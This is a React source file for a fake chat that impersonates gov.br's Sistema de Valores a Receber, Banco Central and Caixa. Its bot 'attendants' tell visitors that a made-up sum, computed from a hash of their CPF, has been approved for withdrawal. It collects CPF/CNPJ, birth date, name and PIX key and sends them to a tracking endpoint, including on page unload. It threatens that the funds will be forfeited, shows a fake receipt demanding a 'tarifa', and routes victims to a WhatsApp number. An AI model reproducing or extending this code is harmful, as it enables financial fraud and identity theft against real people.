import { useState, useEffect, useRef } from "react";
import { CheckCircle2, Search, ArrowRight, ShieldCheck, Loader2, AlertCircle, Play, Pause } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";
import { QRCodeCanvas } from "qrcode.react";
import { safeStorage } from "../utils/storage";

const WhatsAppAudioPlayer = ({ src, attendantName }: { src: string, attendantName: string }) => {
  const [isPlaying, setIsPlaying] = useState(false);
  const [progress, setProgress] = useState(0);
  const audioRef = useRef<HTMLAudioElement>(null);

  useEffect(() => {
    if (audioRef.current) {
      audioRef.current.play().catch(e => console.log('Autoplay prevented'));
    }
  }, []);

  const togglePlay = () => {
    if (audioRef.current) {
      if (isPlaying) audioRef.current.pause();
      else audioRef.current.play();
      setIsPlaying(!isPlaying);
    }
  };

  const handleTimeUpdate = () => {
    if (audioRef.current) {
      setProgress((audioRef.current.currentTime / audioRef.current.duration) * 100);
    }
  };

  return (
    <div className="flex items-center gap-3 bg-[#f0f2f5] rounded-full px-4 py-2 w-full max-w-[280px] shadow-sm mb-2 mt-1">
      <button onClick={togglePlay} className="text-[#54656f] hover:text-[#00a884] transition-colors focus:outline-none bg-white rounded-full p-2 shadow-sm flex items-center justify-center">
        {isPlaying ? <Pause size={18} className="text-[#00a884] fill-current" /> : <Play size={18} className="text-[#54656f] fill-current ml-0.5" />}
      </button>
      <div className="flex-1 h-1.5 bg-[#d1d7db] rounded-full overflow-hidden relative">
         <div className="absolute top-0 left-0 h-full bg-[#00a884] rounded-full transition-all duration-100 ease-linear" style={{ width: `${progress}%` }} />
      </div>
      <div className="text-[#54656f] text-[11px] font-medium min-w-[35px] text-right">
         0:00
      </div>
      <audio 
        ref={audioRef} 
        src={src} 
        onTimeUpdate={handleTimeUpdate} 
        onEnded={() => { setIsPlaying(false); setProgress(0); }} 
        onPlay={() => setIsPlaying(true)}
        onPause={() => setIsPlaying(false)}
        className="hidden" 
      />
    </div>
  );
};

interface ChatStepProps {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
    name?: string;
  };
  onReset: () => void;
}

export function ChatStep({ data, onReset }: ChatStepProps) {
  const [messages, setMessages] = useState<any[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [awaitingPix, setAwaitingPix] = useState(false);
  const [typing, setTyping] = useState(false);
  const [flowState, setFlowState] = useState<number>(0);
  const [leadName, setLeadName] = useState("");
  const [leadValue, setLeadValue] = useState("");
  const [leadPixKey, setLeadPixKey] = useState("");
  const [tarifa, setTarifa] = useState<number>(5.00);
  const [buyPixData, setBuyPixData] = useState<any>(null);
  const [buyPixError, setBuyPixError] = useState<string>("");
  
  const [audioUrl, setAudioUrl] = useState<string | null>(null);
  
  const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });
  const [waNumber, setWaNumber] = useState("5511971730325");

  const endOfMessagesRef = useRef<HTMLDivElement>(null);

  const calculateValue = (doc: string) => {
    const digits = doc.replace(/\D/g, "");
    let seed = 0;
    for (let i = 0; i < digits.length; i++) {
       seed += parseInt(digits[i] || "0") * (i + 1);
    }
    const min = 500;
    const max = 3000;
    const hash = (seed * 9301 + 49297) % 233280;
    const rnd = hash / 233280;
    return min + rnd * (max - min);
  };

  const maskDoc = (doc: string) => {
    if (!doc) return "";
    const digits = doc.replace(/\D/g, '');
    if (digits.length === 11) {
       return `***.${digits.substring(3,6)}.${digits.substring(6,9)}-**`;
    }
    if (digits.length === 14) {
       return `**.***.${digits.substring(5,8)}/${digits.substring(8,12)}-**`;
    }
    return doc;
  };

  useEffect(() => {
    endOfMessagesRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, typing]);

  const hasSetup = useRef(false);

  useEffect(() => {
    if (hasSetup.current) return;
    hasSetup.current = true;

    const setupChat = async () => {
      // Sorteia uma atendente
      const attendants = [
         { name: "Camila", voiceId: "EXAVITQu4vr4xnSDxMaL" },
         { name: "Letícia", voiceId: "EXAVITQu4vr4xnSDxMaL" },
         { name: "Amanda", voiceId: "EXAVITQu4vr4xnSDxMaL" },
         { name: "Juliana", voiceId: "EXAVITQu4vr4xnSDxMaL" }
      ];
      const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
      setAttendant(selectedAttendant);

      const sendTelemetry = (action: string, name: string, val: string) => {
         fetch(`${API_URL}/api/v1/telemetry/chat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action, leadName: name, cpf: data.docValue, value: val }),
            keepalive: true
         }).catch(console.error);
      };

      const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

      try {
        const res = await axios.get(`${API_URL}/api/config`);
        if (data.docType.toUpperCase() === 'CNPJ') {
          setTarifa(15.00);
        } else if (res.data.tarifaTransicional) {
          setTarifa(res.data.tarifaTransicional);
        }
        if (res.data.whatsappNumber) {
          setWaNumber(res.data.whatsappNumber);
        }
      } catch (e) {
        console.error("Config fetch failed", e);
      }

      try {
        setTyping(true);
        await sleep(500);
        setTyping(false);
        addBotMessage(`Olá, me chamo ${selectedAttendant.name} e sou sua Atendente Virtual do gov.br.`);

        await sleep(500);
        setTyping(true);
        await sleep(500);
        setTyping(false);
        addBotMessage("Iniciando conexão segura com o Sistema de Valores a Receber (SVR)...");

        await sleep(500);
        setTyping(true);
        
        let name = data.name || "Cidadão";
        
        // Formatar o nome para Title Case (primeira letra maiúscula) caso venha tudo em MAIÚSCULO
        if (name !== "Cidadão" && name === name.toUpperCase()) {
           name = name.split(' ').map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()).join(' ');
        }
        
        setLeadName(name);
        (window as any)._globalLeadName = name; // Hack to fix closure bug for handleAction

        try {
          // Sincroniza com o backend para geração de pix/pagamento
          const userId = safeStorage.getItem('svr_user_id');
          if (userId) {
            await axios.post(`${API_URL}/api/v1/session/convert`, {
              userId,
              details: {
                docValue: data.docValue,
                birthDate: data.birthDate,
                fullName: name
              }
            }).catch(() => {});
          }
        } catch (e: any) {
          console.error(e);
        }
        
        const val = calculateValue(data.docValue);
        const formattedVal = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        setLeadValue(formattedVal);
        
        sendTelemetry("entered", name, formattedVal);

        await sleep(500);
        setTyping(false);
        addBotMessage(`Consultando base de dados nacional para o ${data.docType.toUpperCase()}: ${data.docValue}...`, undefined, `/assets/banners/banner_saque_aprovado.png?v=${Date.now()}`);
        
        await sleep(500);
        setTyping(true);
        await sleep(500);
        setTyping(false);

        const isCnpj = data.docType.toUpperCase() === 'CNPJ';
        if (isCnpj) {
          addBotMessage(`Antes de prosseguirmos, por favor confirme se os dados informados estão corretos:\n\n**CNPJ:** ${data.docValue}\n**Data de Abertura:** ${data.birthDate}`, [
            { text: "Sim, estão corretos", action: "confirm_identity_yes" },
            { text: "Não, estão errados", action: "confirm_identity_no" }
          ]);
        } else {
          let messageOptions = `Antes de prosseguirmos, por favor confirme se os dados informados estão corretos:\n\n**CPF:** ${data.docValue}\n**Data de Nascimento:** ${data.birthDate}`;
          if (data.name) {
             messageOptions = `Antes de prosseguirmos, por favor confirme se os dados informados estão corretos:\n\n**Nome:** ${name}\n**CPF:** ${data.docValue}\n**Data de Nascimento:** ${data.birthDate}`;
          }
          addBotMessage(messageOptions, [
            { text: "Sim, estão corretos", action: "confirm_identity_yes" },
            { text: "Não, estão errados", action: "confirm_identity_no" }
          ]);
        }

      } catch (e) {
        setTyping(false);
        addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
      }
    };
    
    setupChat();
  }, []);

  const addBotMessage = (text: string, options?: any[], image?: string, customType?: string, audio?: string, video?: string) => {
    setMessages(prev => [...prev, { sender: "bot", text, options, image, customType, audio, video }]);
  };

  useEffect(() => {
    const handleUnload = () => {
      const payload = new Blob([JSON.stringify({
         action: "left", leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue
      })], { type: 'application/json' });
      navigator.sendBeacon(`${API_URL}/api/v1/telemetry/chat`, payload);
    };
    window.addEventListener("beforeunload", handleUnload);
    return () => window.removeEventListener("beforeunload", handleUnload);
  }, [leadName, data.docValue, leadPixKey, leadValue]);

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { sender: "user", text }]);
  };

  const handlePaymentCompleted = () => {
    setMessages(prev => {
      const newMessages = [...prev];
      if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
      return newMessages;
    });
    
    setTyping(true);
    setTimeout(() => {
      setTyping(false);
      const protocol = `SVR-` + Math.floor(Math.random() * 900000) + 100000;
      addBotMessage(`✅ **PAGAMENTO CONFIRMADO!**\n\nSeu protocolo é: **${protocol}**\n\nSua solicitação já está em nosso sistema. Para finalizar a liberação do valor manualmente, clique no botão abaixo e fale com o atendimento no WhatsApp.`, [
        { text: "Liberar Transferência (WhatsApp)", action: "go_whatsapp" }
      ]);
      
      // Request final audio
      axios.post(`${API_URL}/api/v1/tts`, { 
        name: leadName !== "Cidadão" ? leadName : (window as any)._globalLeadName || "Cidadão",
        attendantName: attendant.name,
        voiceId: attendant.voiceId,
        value: leadValue,
        type: 'final'
      }).then(ttsRes => {
        if (ttsRes.data.audioBase64) {
          const finalAudioUrl = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
          setTimeout(() => {
            addBotMessage("", undefined, undefined, undefined, finalAudioUrl);
          }, 2000);
        }
      }).catch(err => console.error("Final TTS error", err));
      
    }, 1500);
  };

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (buyPixData?.id) {
      interval = setInterval(async () => {
        try {
          const res = await axios.get(`${API_URL}/api/v1/buypix/status/${buyPixData.id}`);
          if (res.data.status === 'completed') {
            clearInterval(interval);
            handlePaymentCompleted();
          }
        } catch (e) {
          console.error("Polling error", e);
        }
      }, 5000);
    }
    return () => clearInterval(interval);
  }, [buyPixData]);
  const identifyPixType = (key: string) => {
    if (!key) return "Inválida";
    
    // Email PIX validation
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(key)) return "E-mail";
    
    // UUID Random Key validation (32 chars hex or 36 chars with hyphens)
    const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
    const uuidRegexNoHyphen = /^[0-9a-f]{32}$/i;
    if (uuidRegex.test(key) || uuidRegexNoHyphen.test(key)) return "Chave Aleatória";

    // Extract digits and letters
    const justDigits = key.replace(/\D/g, "");
    const justLetters = key.replace(/[^a-zA-Z]/g, "");

    // CPF, CNPJ, Celular cannot contain letters
    if (justLetters.length === 0) {
      if (justDigits.length === 11) return "CPF/Celular";
      if (justDigits.length === 14) return "CNPJ";
      if (justDigits.length >= 10 && justDigits.length <= 13) return "Celular";
    }

    return "Inválida";
  };

  const handleAction = async (action: string, payload?: string) => {
    if (action === "confirm_identity_yes") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      addUserMessage("Sim, estão corretos");
      setTyping(true);

      setTimeout(() => {
        setTyping(false);
        addBotMessage(`Buscando histórico de contas vinculadas e saldos inativos...`);
        
        setTimeout(async () => {
          setTyping(true);
          
          let localAudioUrl: string | undefined = undefined;
          try {
             const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
                name: leadName !== "Cidadão" ? leadName : (window as any)._globalLeadName || "Cidadão",
                attendantName: attendant.name,
                voiceId: attendant.voiceId,
                value: leadValue,
                docType: data.docType
             });
             if (ttsRes.data.audioBase64) {
                localAudioUrl = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
                setAudioUrl(localAudioUrl);
             }
          } catch (err: any) {
             console.error("TTS generation error", err);
          }

          setTimeout(() => {
            setTyping(false);
            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, undefined, undefined, localAudioUrl);
            
            setTimeout(() => {
              setTyping(true);
              setTimeout(() => {
                setTyping(false);
                addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, `/assets/banners/video_explicacao.mp4?v=${Date.now()}`);
                
                setTimeout(() => {
                  setTyping(true);
                  setTimeout(() => {
                    setTyping(false);
                    addBotMessage(`Clique no botão abaixo para prosseguir com a liberação da transferência.`, [
                      { text: "Efetuar saque", action: "proceed_after_video" }
                    ]);
                  }, 1500);
                }, 2000);
              }, 2500);
            }, 1500);
          }, 2500);
        }, 1500);
      }, 800);
    }
    else if (action === "confirm_identity_no") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      addUserMessage("Não, está errado");
      setTyping(true);
      setTimeout(() => {
        setTyping(false);
        addBotMessage("Por favor, atualize a página e preencha com o documento correto.");
      }, 1000);
    }
    else if (action === "proceed_after_video") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      addUserMessage("Efetuar saque");
      setTyping(true);
      
      setTimeout(() => {
        setTyping(false);
        addBotMessage("Aguarde um momento, validando sua solicitação no sistema...");
        
        setTyping(true);
        setTimeout(() => {
          setTyping(false);
          addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber o valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
             { text: "Entendi, quero receber", action: "ask_pix" }
          ]);
        }, 2500);
      }, 1000);
    }
    else if (action === "ask_pix") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      addUserMessage("Entendi, quero receber");
      setTyping(true);

      setTimeout(() => {
        setTyping(false);
        addBotMessage("Registrando o seu aceite e preparando um ambiente seguro...");
        
        setTyping(true);
        setTimeout(() => {
          setTyping(false);
          const isCnpj = data.docType.toUpperCase() === 'CNPJ';
          if (isCnpj) {
            addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a Chave PIX da empresa (ou a sua Chave PIX de preferência):`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
          } else {
            addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, `/assets/banners/banner_pix.png?v=${Date.now()}`);
          }
          setAwaitingPix(true);
        }, 2500);
      }, 1000);
    }
    else if (action === "submit_pix") {
      const pix = payload || inputValue;
      if (!pix) return;
      
      const pixType = identifyPixType(pix);
      if (pixType === "Inválida") {
         setAwaitingPix(false);
         setInputValue("");
         addUserMessage(pix);
         setTyping(true);
         setTimeout(() => {
            setTyping(false);
            addBotMessage("Eu não consegui identificar isso como uma chave PIX válida. Verifique se digitou corretamente (CPF, Celular, E-mail ou Chave Aleatória):");
            setAwaitingPix(true);
         }, 800);
         return;
      }

      setAwaitingPix(false);
      setInputValue("");
      addUserMessage(pix);
      setLeadPixKey(pix);
      setTyping(true);
      
      setTimeout(() => {
        setTyping(false);
        addBotMessage("Aguarde enquanto processamos a solicitação de saque");
        
        setTyping(true);
        setTimeout(() => {
          setTyping(false);
          const reqNumber = Math.floor(Math.random() * 90000000000) + 10000000000;
          addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada para a Chave Pix cadastrada:\nChave Pix: **${pix}**\n\nClique no botão abaixo para efetuar a transferência do valor de **${leadValue}** para a conta da Chave Pix cadastrada.`, [
            { text: "Efetuar saque", action: "go_whatsapp" }
          ]);
        }, 1500);
      }, 800);
    }

    else if (action === "go_whatsapp") {
      fetch(`${API_URL}/api/v1/telemetry/chat`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ action: 'whatsapp', leadName, cpf: data.docValue, pix: leadPixKey, value: leadValue })
      }).catch(console.error);

      const message = encodeURIComponent(`Olá, sou o(a) ${leadName}. Quero liberar minha transferência do valor de ${leadValue} na minha conta.`);
      window.open(`https://wa.me/${waNumber}?text=${message}`, '_blank');
    }
  };

  const copyPix = () => {
    if (buyPixData?.pix_qr_code) {
      navigator.clipboard.writeText(buyPixData.pix_qr_code);
      alert("PIX copiado com sucesso!");
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#161c24] flex flex-col font-sans overflow-hidden">
      
      {/* Messages Area */}
      <div className="flex-1 overflow-y-auto px-4 py-8 space-y-6">
        <AnimatePresence>
          {messages.map((msg, i) => (
            <motion.div 
              key={i} 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start items-start gap-3'}`}
            >
              {msg.sender === 'bot' && (
                <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                  <img src={`/assets/banners/bot_avatar.png?v=${Date.now()}`} alt="gov.br" className="w-full h-full object-contain rounded-full" />
                </div>
              )}

              <div className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'} w-full max-w-[85%]`}>
                <div className={`p-4 text-[15px] leading-relaxed shadow-sm w-full ${
                  msg.sender === 'user' 
                    ? 'bg-[#1b365d] text-white rounded-2xl rounded-tr-sm' 
                    : 'bg-[#1e2732] text-[#d1d5db] rounded-2xl rounded-tl-sm'
                }`}>
                  {msg.customType === "receipt" ? (
                    <div className="w-full">
                      {/* Receipt Card */}
                      <div className="bg-[#f4f5f7] rounded-md mb-5 shadow-sm text-gray-800 overflow-hidden border border-gray-200 font-sans">
                        {/* Caixa Header */}
                        <div className="bg-[#005CA9] pt-6 pb-12 px-5 relative overflow-hidden">
                           <div className="absolute inset-0 opacity-10 bg-[url('/assets/logos/caixa-pattern.png')] bg-cover"></div>
                           <h4 className="text-white font-black text-2xl tracking-tighter flex items-center relative z-10">
                              CAIXA<span className="text-[#F39200] ml-1.5 text-2xl font-black">I</span>
                           </h4>
                        </div>
                        
                        {/* Floating Card */}
                        <div className="bg-white p-4 mx-4 mt-[-24px] rounded shadow-md flex justify-between relative z-10 text-center">
                          <div className="flex-1 border-r border-gray-300 pr-2">
                            <p className="text-gray-500 text-[13px] mb-1">Valor</p>
                            <p className="text-[#005CA9] font-black text-xl">{leadValue}</p>
                          </div>
                          <div className="flex-1 pl-2">
                            <p className="text-gray-500 text-[13px] mb-1">Data</p>
                            <p className="text-[#005CA9] font-black text-[15px]">{new Date().toLocaleDateString('pt-BR')}</p>
                            <p className="text-[#005CA9] text-[13px] mt-0.5">{new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</p>
                          </div>
                        </div>

                        {/* Recebedor info */}
                        <div className="px-5 pt-6 pb-4 bg-[#f4f5f7]">
                          <div className="border-b-[1.5px] border-[#005CA9] pb-1.5 mb-4">
                            <h3 className="text-[#005CA9] font-bold text-[16px]">Dados do recebedor</h3>
                          </div>
                          
                          <div className="space-y-4">
                            <div>
                              <p className="text-gray-500 text-[14px] mb-0.5">Nome</p>
                              <p className="text-[#333333] font-black text-[15px] uppercase">{leadName !== "Cidadão" ? leadName : "BENEFICIÁRIO(A)"}</p>
                            </div>
                            <div>
                              <p className="text-gray-500 text-[14px] mb-0.5">{data.docType}</p>
                              <p className="text-[#333333] font-black text-[15px]">{maskDoc(data.docValue)}</p>
                            </div>
                          </div>
                        </div>

                        {/* Pagador info */}
                        <div className="px-5 py-6 bg-white">
                          <div className="border-b-[1.5px] border-[#005CA9] pb-1.5 mb-4">
                            <h3 className="text-[#005CA9] font-bold text-[16px]">Dados do pagador</h3>
                          </div>
                          
                          <div className="space-y-4">
                            <div>
                              <p className="text-gray-500 text-[14px] mb-0.5">Nome</p>
                              <p className="text-[#333333] font-black text-[15px] uppercase">SVR - LIBERAÇÃO DE VALORES / GOV.BR</p>
                            </div>
                            <div>
                              <p className="text-gray-500 text-[14px] mb-0.5">Instituição</p>
                              <p className="text-[#333333] font-black text-[15px] uppercase">BANCO CENTRAL DO BRASIL</p>
                            </div>
                          </div>
                        </div>
                      </div>

                      {/* Text below receipt */}
                      <div className="text-[#e2e8f0] space-y-4 text-[14px] leading-relaxed mt-4">
                        <p className="font-bold text-[15px] text-white">GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
                        <p>O cálculo do valor total da tarifa é feito sobre o valor que você tem disponível para receber (<span className="font-bold">{leadValue}</span>).</p>
                        
                        <div className="space-y-1 my-4 text-[#cbd5e1]">
                          <p>Tarifa Transacional: <span className="text-white">R$ {(tarifa - 1.98).toFixed(2).replace('.', ',')}</span></p>
                          <p>Contribuição Federal: <span className="text-white">R$ 0,99</span></p>
                          <p>Tarifa de Saque: <span className="text-white">R$ 0,99</span></p>
                          <p className="font-bold text-white">Total da Tarifa: R$ {tarifa.toFixed(2).replace('.', ',')}</p>
                        </div>

                        <p className="font-bold text-white uppercase">
                          APÓS O PAGAMENTO DA TARIFA, EM ATÉ 2 HORAS VOCÊ RECEBERÁ O VALOR TOTAL DE {leadValue} NA CONTA DA CHAVE PIX CADASTRADA:
                        </p>

                        <div className="mt-2 text-[#cbd5e1]">
                          <p>Nome: <span className="text-white font-bold">{leadName}</span></p>
                          <p>Chave Pix: <span className="text-white font-bold">{leadPixKey || "Informada no checkout"}</span></p>
                        </div>
                      </div>

                      {/* Ação para WhatsApp */}
                      <div className="mt-6 pt-5 border-t border-[#2e3b4e] flex flex-col items-center space-y-4">
                        <button 
                          onClick={() => handleAction("go_whatsapp")} 
                          className="w-full max-w-[280px] bg-[#25D366] hover:bg-[#128C7E] text-white py-4 rounded-md font-bold transition-colors shadow-md text-[15px] mt-2 flex items-center justify-center gap-2"
                        >
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
                              <path d="M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c-.003 1.396.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z"/>
                            </svg>
                            FINALIZAR LIBERAÇÃO
                        </button>
                      </div>

                    </div>
                  ) : msg.customType === "audio" ? (
                    <div className="w-full flex items-center justify-center p-1">
                      <WhatsAppAudioPlayer src={msg.audio} attendantName={attendant.name} />
                    </div>
                  ) : (
                    <>
                      {msg.audio && (
                         <WhatsAppAudioPlayer src={msg.audio} attendantName={attendant.name} />
                      )}
                      {msg.image && (
                         <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
                      )}
                      {msg.video && (
                         <video src={msg.video} controls playsInline className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
                      )}
                      {msg.text.split('\n').map((line:string, idx:number) => (
                         <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
                      ))}
                    </>
                  )}
                </div>

                {msg.options && msg.options.length > 0 && (
                  <div className="mt-3 flex justify-end w-full">
                    {msg.options.map((opt: any, j: number) => (
                      <button 
                        key={j}
                        onClick={() => handleAction(opt.action)}
                        className="bg-[#ff9029] hover:bg-[#e87f1f] text-white font-bold py-2.5 px-6 rounded transition-colors shadow-md text-sm tracking-wide"
                      >
                        {opt.text}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </motion.div>
          ))}





          <div ref={endOfMessagesRef} />
        </AnimatePresence>
      </div>

      {/* Input Area (Apenas quando aguarda o PIX) */}
      <AnimatePresence>
        {awaitingPix && (
          <motion.div 
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="p-4 bg-[#1e2732] flex items-center space-x-3 shadow-[0_-4px_15px_rgba(0,0,0,0.2)]"
          >
            <input 
              type="text" 
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleAction("submit_pix")}
              placeholder="Digite sua chave PIX..."
              className="flex-1 bg-[#161c24] border border-[#2d3748] text-white rounded-full px-5 py-3 text-sm focus:outline-none focus:border-[#ff9029]"
            />
            <button 
              onClick={() => handleAction("submit_pix")}
              className="w-12 h-12 bg-[#ff9029] text-white rounded-full flex items-center justify-center hover:bg-[#e87f1f] transition-colors shadow-lg"
            >
              <ArrowRight size={20} />
            </button>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

const CountdownTimer = () => {
  const [timeLeft, setTimeLeft] = useState(600); // 10 minutos
  
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);
  
  const m = Math.floor(timeLeft / 60);
  const s = timeLeft % 60;
  return <span>{m.toString().padStart(2, '0')}:{s.toString().padStart(2, '0')}</span>;
};
